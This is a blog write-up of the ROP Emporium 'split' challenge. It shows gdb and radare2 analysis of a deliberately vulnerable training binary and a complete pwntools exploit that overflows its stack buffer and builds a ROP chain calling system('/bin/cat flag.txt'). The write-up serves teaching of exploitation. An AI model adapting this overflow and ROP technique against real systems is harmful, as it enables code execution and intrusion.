<!DOCTYPE html>
<html lang="en">
  <head>
    

<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>

<meta charset="utf-8" >

<title>RopEmporium - Split</title>
<meta name="keywords" content="RopEmporium - Split, LaByte">
<meta name="description" content="The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="/favicon.ico">
<link rel="stylesheet" href="/style/main.css">


<link rel="stylesheet" href="/style/jquery.fancybox.min.css">




    <link rel="stylesheet" href="/style/prism.css"/>




  <meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="http://thuri10.github.io">
        <img class="avatar" src="/images/avatar.png" alt="" width="32px" height="32px">
      </a>
      <a href="http://thuri10.github.io">
        <h1 class="site-title">LaByte</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/" class="menu purple-link">
        Home
      </a>
    
  
    
      <a href="/archives" class="menu purple-link">
        Archives
      </a>
    
  
    
      <a href="/about" class="menu purple-link">
        About
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">RopEmporium - Split</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2021-12-17</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/tags/ropemporium/">
              ropemporium
                
                  ，
                
              </a>
            
              <a href="/tags/rop/">
              rop
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <p>The elements that allowed you to complete ret2win are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain</p>
<p>The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The binary can be downloaded from the authors website <a target="_blank" rel="noopener" href="https://ropemporium.com/">ropemporium</a>.</p>
<p>First we check the binary protections enabled. Only <strong>NX</strong> (Not executable) is enabled on the device according to <code>checksec</code> binary utility as shown in the image below.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:split$ checksec <span class="token parameter variable">--file</span><span class="token operator">=</span>split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>For analysis of binary we use <code>gdb</code> to analyze the functions present in the binary in order to understand the logic. We disassemble <strong>pwnme</strong> function as shown in the image below.The function looks familiar as for the ret2win function.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas pwnme
Dump of assembler code for function pwnme:
   <span class="token number">0x00000000004006e8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x00000000004006e9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x00000000004006ec</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000004006f0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x00000000004006f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000004006f9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000004006fe</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x0000000000400701</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span>:	call   <span class="token number">0x400580</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400706</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400810</span>
   <span class="token number">0x000000000040070b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">35</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400710</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40083c</span>
   <span class="token number">0x0000000000400715</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">45</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
   <span class="token number">0x000000000040071a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span>:	call   <span class="token number">0x400570</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
   <span class="token number">0x000000000040071f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">55</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x0000000000400723</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">59</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x60</span>
   <span class="token number">0x0000000000400728</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x000000000040072b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
   <span class="token number">0x0000000000400730</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">72</span><span class="token operator">></span>:	call   <span class="token number">0x400590</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400735</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">77</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40083f</span>
   <span class="token number">0x000000000040073a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">82</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x000000000040073f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">></span>:	nop
   <span class="token number">0x0000000000400740</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">></span>:	leave
   <span class="token number">0x0000000000400741</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">89</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.</p>
<p><img src="/images/ropemporium/stack.png"></p>
<p>Next function is <strong>read</strong> function, which reads for user input from the standard input file descriptor and stores in specified buffer. From disassembled code, we are reading <strong>0x60</strong> bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold, therefore leading to stack buffer overflow.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>For this challenge we don’t have a <code>ret2win</code> function which we are to return to. From the disassembly of the binary we have an interesting function called <strong>usefulFunction</strong> responsible for listing the files in the directory when called.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas usefulFunction
Dump of assembler code for function usefulFunction:
   <span class="token number">0x0000000000400742</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400743</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x0000000000400746</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40084a</span>
   <span class="token number">0x000000000040074b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span>:	call   <span class="token number">0x400560</span> <span class="token operator">&lt;</span>system@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400750</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">></span>:	nop
   <span class="token number">0x0000000000400751</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span>:	pop    <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400752</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb) x<span class="token operator">/</span>s <span class="token number">0x40084a</span>
<span class="token number">0x40084a</span>:	<span class="token string">"/bin/ls"</span>
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Goal is to pass a different string to the <code>system</code> function instead of <strong>“&#x2F;bin&#x2F;ls”</strong></p>
<p>From the author’s hint, we can look for useful hints in the binary using either radare2.</p>
<blockquote>
<p>Now that you’ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the <strong>“&#x2F;bin&#x2F;cat flag.txt”</strong> string as the only argument. You’ll also have to start dealing with the differences between the various architectures’ calling conventions.</p>
</blockquote>
<p>Analyzing binary using <code>radare2</code>, we can use <strong>iz</strong> command to look for strings. The goal is to read the flag from the system.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token operator">[</span><span class="token number">0x004005b0</span><span class="token operator">]</span><span class="token operator">></span> iz
nth paddr      vaddr      len size section type  string
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
<span class="token number">0</span>   <span class="token number">0x000007e8</span> <span class="token number">0x004007e8</span> <span class="token number">21</span>  <span class="token number">22</span>   .rodata ascii split by ROP Emporium
<span class="token number">1</span>   <span class="token number">0x000007fe</span> <span class="token number">0x004007fe</span> <span class="token number">7</span>   <span class="token number">8</span>    .rodata ascii x86_64\n
<span class="token number">2</span>   <span class="token number">0x00000806</span> <span class="token number">0x00400806</span> <span class="token number">8</span>   <span class="token number">9</span>    .rodata ascii \nExiting
<span class="token number">3</span>   <span class="token number">0x00000810</span> <span class="token number">0x00400810</span> <span class="token number">43</span>  <span class="token number">44</span>   .rodata ascii Contriving a reason to ask user for data...
<span class="token number">4</span>   <span class="token number">0x0000083f</span> <span class="token number">0x0040083f</span> <span class="token number">10</span>  <span class="token number">11</span>   .rodata ascii Thank you<span class="token operator">!</span>
<span class="token number">5</span>   <span class="token number">0x0000084a</span> <span class="token number">0x0040084a</span> <span class="token number">7</span>   <span class="token number">8</span>    .rodata ascii <span class="token operator">/</span>bin<span class="token operator">/</span>ls
<span class="token number">0</span>   <span class="token number">0x00001060</span> <span class="token number">0x00601060</span> <span class="token number">17</span>  <span class="token number">18</span>   .data   ascii <span class="token operator">/</span>bin<span class="token operator">/</span>cat flag.txt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We have an important string <strong>“&#x2F;bin&#x2F;cat flag.txt”</strong> which will enable us to complete our goal. Now we need pass string to system function as follows <strong>system(‘&#x2F;bin&#x2F;cat flag.txt’)</strong>.</p>
<p>For building ropchain, we need to understand the calling conventions of <strong>AMD64 ABI</strong>.The calling convention passes the arguments to the registers in the following order <strong>RDI, RSI, RDX, RCX, R8 and R9</strong>.</p>
<p>Because the system function receives one argument, we need to look for one gadget t that we control <strong>rdi</strong> address.</p>
<p><strong>What are gadgets?</strong></p>
<p>Gadgets are sequence of instructions that end with <code>ret</code> instruction. Because we want to load a value into rdi register, we look for a pop <strong>pop rdi; ret</strong> instruction in order to pass an argument to <code>system</code>.</p>
<p>For searching gadget in radare2&#x2F;rizin, use <strong>&#x2F;R</strong> command as shown in the image below.</p>
<p><img src="/images/ropemporium/split_poprdi.png"><br>Now we need to chain ropchain exploit as shown in the image below.</p>
<p><img src="/images/ropemporium/popgadget.png" alt="ropchain"></p>
<p>The goal is to overwrite the return address with the address of <strong>“pop rdi, ret “</strong> and call system function. we need to fill the buffer memory with 32bytes, 8 bytes to overwrite the <code>rbp</code> address and 8 bytes to overwrite return address with pop rdi address.</p>
<p>Full exploit of split challenge is;</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn

pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"latin-1"</span>
pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>

io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span>

system_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x400560</span><span class="token punctuation">)</span>   <span class="token comment">#address of system</span>
pop_rdi_ret <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x004007c3</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdi; ret gadget</span>
bin_cat_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00601060</span><span class="token punctuation">)</span>  <span class="token comment">#bin cat flag.txt address</span>

payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">32</span>  <span class="token comment">#fill the buffer</span>
payload <span class="token operator">+=</span> <span class="token string">b"B"</span> <span class="token operator">*</span><span class="token number">8</span>   <span class="token comment"># overwrite  rbp</span>
payload <span class="token operator">+=</span> pop_rdi_ret <span class="token comment"># pop rdi gadget</span>
payload <span class="token operator">+=</span> bin_cat_addr <span class="token comment"># argument passed to the system function</span>
payload <span class="token operator">+=</span> system_addr   <span class="token comment">#call system</span>

io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Running python3 code we get a flag.</p>
<p><img src="/images/ropemporium/split_flag.png"></p>
<blockquote>
<p><strong>To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.</strong></p>
</blockquote>

        </div>
        <div class="top-div">
          
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/ROP-write4/">
          <h3 class="post-title">
            Next: RopEmporium - Write4
          </h3>
        </a>
      </div>
    
  </div>




<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a href="https://github.com/thuri10" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
        <a href="https://twitter.com/thuri0" target="_blank">
          <i class="icon icon-twitter"></i>
        </a>
      
    
  </div>
  
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
  
  
  
  
  
  
</div>
</footer>
      </div>
      
    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.fancybox.min.js"></script>



    <script>window.is_post = true;</script>


<script src="/js/main.js"></script>





    </div>
  </body>
</html>

